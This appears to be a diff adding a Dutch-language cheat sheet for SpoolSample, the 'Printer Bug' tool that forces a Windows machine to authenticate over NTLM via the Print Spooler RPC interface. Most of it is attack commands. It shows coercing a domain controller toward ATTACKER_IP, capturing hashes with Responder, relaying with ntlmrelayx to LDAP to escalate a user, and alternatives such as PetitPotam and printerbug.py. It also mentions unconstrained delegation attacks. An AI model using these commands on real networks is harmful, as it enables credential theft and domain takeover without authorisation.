@@ -1,0 +1,38 @@
+# SpoolSample — Printer Bug trigger (NTLM coercion via MS-RPRN)
+# Forceert een doelmachine om te authenticeren naar jouw listener via de Print Spooler service
+#
+# === Syntax ===
+# SpoolSample.exe <TARGET> <ATTACKER_IP>
+#
+# === Parameters ===
+# TARGET          Doelmachine (hostname of IP) met Print Spooler actief
+# ATTACKER_IP     Jouw machine die de NTLM authenticatie ontvangt
+#
+# === Werking ===
+# Roept RpcRemoteFindFirstPrinterChangeNotification aan op TARGET
+# TARGET's Print Spooler stuurt NTLM authenticatie naar ATTACKER_IP
+# De NTLM hash kan worden gevangen (Responder) of gerelayd (ntlmrelayx)
+#
+# === Voorbeelden ===
+# Basis: forceer DC om te authenticeren naar attacker:
+SpoolSample.exe DC ATTACKER_IP
+# In combinatie met Responder (vang de hash):
+# Terminal 1: python3 Responder.py -I eth0
+# Terminal 2: SpoolSample.exe DC ATTACKER_IP
+# In combinatie met ntlmrelayx (relay naar ander target):
+# Terminal 1: ntlmrelayx.py -t ldap://DC2 --escalate-user USER
+# Terminal 2: SpoolSample.exe DC ATTACKER_IP
+#
+# === Vereisten ===
+# Print Spooler service moet draaien op TARGET (standaard aan)
+# Domain user rechten zijn voldoende
+# Werkt NIET als Print Spooler uitgeschakeld is
+#
+# === Alternatieven ===
+# dementor.py TARGET ATTACKER_IP (Python, zelfde werking)
+# PetitPotam.py ATTACKER_IP TARGET (EfsRpc, geen auth nodig)
+# printerbug.py DOMAIN/USER:PASS@TARGET ATTACKER_IP
+#
+# Tip: Check of Spooler draait: ls \\TARGET\pipe\spoolss
+# Tip: Wordt vaak gebruikt voor unconstrained delegation aanval
+# Tip: Zie ook: man_spoolfool, get_spoolsample, get_petitpotam
